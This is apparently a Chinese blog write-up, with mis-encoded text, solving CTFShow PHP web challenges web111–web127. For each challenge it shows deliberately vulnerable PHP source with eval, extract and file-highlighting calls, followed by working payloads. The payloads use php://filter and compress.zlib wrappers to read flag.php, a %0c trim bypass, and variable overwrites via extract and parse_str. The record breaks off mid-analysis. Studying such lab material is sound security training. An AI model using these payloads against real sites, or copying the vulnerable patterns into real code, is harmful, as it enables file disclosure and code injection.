<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: h1xa</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-30 02:41:40</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;</span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;];</span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;];</span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;</span><br><span class="line">            die(&quot;error v1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;</span><br><span class="line">            die(&quot;error v2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå®šä¹‰äº†ä¸€ä¸ªå‡½æ•° getFlag()æœ‰ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯&amp;$v1,&amp;$v2, å…¶ä¸­eval(â€œ$$v1 = &amp;$$v2;â€); è¡¨ç¤º $$v1=($$v2çš„<strong>åœ°å€</strong>)=$v2;</li>
<li>å…¶æ¬¡ä»ç„¶å¯¹$v1,$v2è¿‡æ»¤äº†å¾ˆå¤šå†…å®¹</li>
<li>ç„¶åå¯¹$v1è¿›è¡ŒåŒ¹é…ä¸º ctfshowæ‰èƒ½æ‰§è¡Œå®ƒçš„åˆ†æ”¯ï¼Œæ‰èƒ½è°ƒç”¨ä¸Šé¢å®šä¹‰çš„å‡½æ•°ï¼›é‚£ä¹ˆ$v1=ctfshow, $$v1=$ctfshow, $ctfshow=$v2; è¿™æ—¶ç¬¬ä¸€ä¸ªå‚æ•° $v1=ctfshow,å‡ºæ¥äº†ï¼Œç¬¬äºŒä¸ªå‚æ•°å¯ä»¥åˆ©ç”¨ï¼š GLOBALS</li>
<li>å› æ­¤: ?v1=ctfshow&amp;v2=GLOBALS</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web111.png"></p>
<h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><p>æºç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-30 23:47:49</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&quot;hacker!&quot;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œè‡ªå®šä¹‰äº†ä¸€ä¸ªå‡½æ•° filter() åŠŸèƒ½æ˜¯å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡ŒåŒ¹é…è¿‡æ»¤</li>
<li>ç„¶å is_file() å‡½æ•°çš„åŠŸèƒ½æ˜¯ï¼šåˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶ï¼Œæ³¨æ„ !(é)æ“ä½œï¼Œè¦ä¸æ˜¯ä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶è·¯å¾„æ‰ä¼šæ‰§è¡Œå®ƒçš„åˆ†æ”¯</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web112.png"></p>
<ul>
<li>è¿™é“é¢˜è¿‡æ»¤äº† input, rot13, base64 ä½†æ˜¯è¿˜æœ‰è®¸å¤šä¼ªåè®®ï¼Œç¼–ç æ–¹å¼æ²¡æœ‰è¿‡æ»¤ğŸ‚ğŸº:</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web112_1.png"></p>
<h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-30 23:47:52</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå‘ç°åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå¯¹  filterè¿›è¡Œäº†åŒ¹é…ï¼Œé‚£æ²¡äº‹æ²¡æœ‰å¯¹ compress.zlib://è¿›è¡Œè¿‡æ»¤</li>
<li>compress.zlib://flag.php</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web113.png"></p>
<h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><p>æºç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-16 11:25:09</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-10-01 15:02:53</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">echo &quot;å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼&quot;;</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125; å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>é˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå‘ç°å¯¹ compressè¿›è¡Œäº†åŒ¹é…ï¼Œä½†å´å¯¹ filter çš„åŒ¹é…å–æ¶ˆäº†</li>
<li>?file=php://filter/resource=flag.php</li>
<li>ğŸ˜•</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web114.png"></p>
<h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-01 15:08:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;0&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;e&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span>=str_replace(<span class="string">&quot;+&quot;</span>,<span class="string">&quot;1&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> trim(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> filter(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!!!&quot;</span>;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œå®šä¹‰äº†ä¸€ä¸ªå‡½æ•° filter() è¿‡æ»¤äº†ä¸€äº›å†…å®¹ã€‚</li>
<li>is_numeric() åˆ¤æ–­æ˜¯å¦ä¸ºæ•°å­—ã€‚</li>
<li><strong>trim()</strong> ç§»é™¤å­—ç¬¦ä¸²é¦–å°¾çš„ç©ºç™½å­—ç¬¦(æˆ–è€…å…¶ä»–å­—ç¬¦) <strong>é‡ç‚¹ï¼Œå¤§å‘ã€‚</strong></li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web115.png"></p>
<ul>
<li><p>æ³¨æ„å›¾ä¸­ trim() ä¼šå»é™¤çš„å­—ç¬¦æœ‰: \nâ€ (ASCII 10 (0x0A))ï¼Œæ¢è¡Œç¬¦, \x0Bâ€ (ASCII 11 (0x0B))ï¼Œå‚ç›´åˆ¶è¡¨ç¬¦ã€‚ â€œ\râ€ (ASCII 13 (0x0D))ï¼Œå›è½¦ç¬¦ã€‚  æœ‰ 0A, 0B, 0D å”¯ç‹¬æ²¡æœ‰ 0c ï¼Œ 0x0c ä¸ºåˆ†é¡µç¬¦ã€‚è¿™æ„æ€å°±æ˜¯ trim() å¯¹ å­—ç¬¦ä¸²é¦–å°¾æœ‰ 0x0cçš„å­—ç¬¦ä¸èµ·ä½œç”¨ï¼Œè¿™â„¢è°çŸ¥é“æœ‰è¿™èŒ¬å•Šã€‚</p>
</li>
<li><p>!==: ä¸å…¨ç­‰ï¼Œä¼šæ¯”è¾ƒç±»å‹å’Œå€¼ï¼Œ == å¼±ç±»å‹æ¯”è¾ƒï¼Œåªæ¯”è¾ƒæ•°å€¼, æ³¨æ„è¿™ç‚¹ï¼Œé‚£ä¹ˆ $num!==â€™36â€™ ä¸ $num==â€™36â€™ å°†ä¸ä¼šçŸ›ç›¾ï¼Œå› æ­¤ ç¬¬ä¸€ä¸ª if æ‰ä¸ºTrue æ‰èƒ½ç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚</p>
</li>
<li><p>?num=%0c36</p>
</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web115_1.png"></p>
<h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><p>æºç :</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Author: Firebasky</span><br><span class="line"># @Date:   2020-09-05 20:49:30</span><br><span class="line"># @Last Modified by:   h1xa</span><br><span class="line"># @Last Modified time: 2020-09-07 22:02:47</span><br><span class="line"># @email: h1xa@ctfer.com</span><br><span class="line"># @link: https://ctfer.com</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$c=$_POST[&#x27;fun&#x27;];</span><br><span class="line">if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;</span><br><span class="line">    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;</span><br><span class="line">         eval(&quot;$c&quot;.&quot;;&quot;);  </span><br><span class="line">         if($fl0g===&quot;flag_give_me&quot;)&#123;</span><br><span class="line">             echo $flag;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ul>
<li>è¿™é“é¢˜ä¸çœ‹æç¤ºï¼Œæˆ‘çœŸä¸çŸ¥é“ php ä¼šæŠŠ è·å–åˆ°çš„å‚æ•° å°æ•°ç‚¹ è‡ªåŠ¨è½¬åŒ–ä¸º ä¸‹åˆ’çº¿ : . _ ; ä¸‹åˆ’çº¿åˆç­‰äº[, è€Œä¸”åªä¼šè½¬æ¢ä¸€æ¬¡.</li>
<li>å…ˆçœ‹ç»™å‡ºçš„ç­”æ¡ˆ: <strong>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo $flag</strong> ,å…¶ä¸­å°† CTF_SHOW.COM ä¸­ä¸‹åˆ’çº¿æ”¹ä¸ºäº†[ è¿™æ ·è½¬æ¢äº†ä¸€æ¬¡åé¢çš„å°æ•°ç‚¹å°†ä¸ä¼šè‡ªåŠ¨è½¬æ¢ä¸º _(ä¸‹åˆ’çº¿)</li>
<li>æœ¬åœ°è¯•éªŒçœ‹çœ‹:</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web123.png"></p>
<ul>
<li>å¦‚å›¾æ‰€ç¤º: å¦‚æœåŸå°ä¸åŠ¨çš„ä¼ å…¥å‚æ•°,var_dump() å°†ä¸ä¼šæ‰§è¡Œï¼Œå”¯æœ‰æ‰‹åŠ¨å°†ç¬¬ä¸€ä¸ªä¸‹åˆ’çº¿æ”¹ä¸º[ï¼ˆå·¦ä¸­æ‹¬å·æ‰èƒ½è¡Œï¼‰,è¿™ä¸ªç‰¹æ€§ğŸ‚ğŸº</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web123_1.png"></p>
<h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå¢åŠ äº† å¯¹ flag, echo ,GLOBALS, var_dump, print çš„è¿‡æ»¤</li>
<li>GET:?1=flag.php POST: CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=highlight_file($_GET[1])</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web125.png"></p>
<ul>
<li>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</li>
<li>extract() å‡½æ•°å¯ä»¥è¦†ç›–å˜é‡ï¼Œå­¦åˆ°äº†</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web125_1.png"></p>
<h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i&quot;</span>, <span class="variable">$c</span>) &amp;&amp; strlen(<span class="variable">$c</span>)&lt;=<span class="number">16</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>åˆå¢åŠ äº†ç¬¬ g i f c o d çš„è¿‡æ»¤</li>
<li>GET:?a=1+fl0g=flag_give_me<br>POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web126.png"></p>
<ul>
<li>æä¸æ‡‚,æˆ‘æ˜¯å‚»é€¼</li>
</ul>
<h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = md5(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(waf(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    extract(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<ul>
<li>é¦–å…ˆé˜…è¯»ç¨‹åºä¸Šä¸‹æ–‡ï¼Œ$ctf_show = md5($flag) å°†å˜é‡ flag md5è½¬æ¢è¿‡åèµ‹å€¼ç»™äº† å˜é‡ ctf_show, ç´§æ¥ç€ä¸‹ä¸€å¥: $url = $_SERVER[â€˜QUERY_STRINGâ€™]; $_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºï¼ŒQUERY_STRING:</li>
</ul>
<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web127.png"></p>
<ul>
<li>æœ¬åœ°è¯•éªŒä¸€ä¸‹ï¼š</li>
</ul>
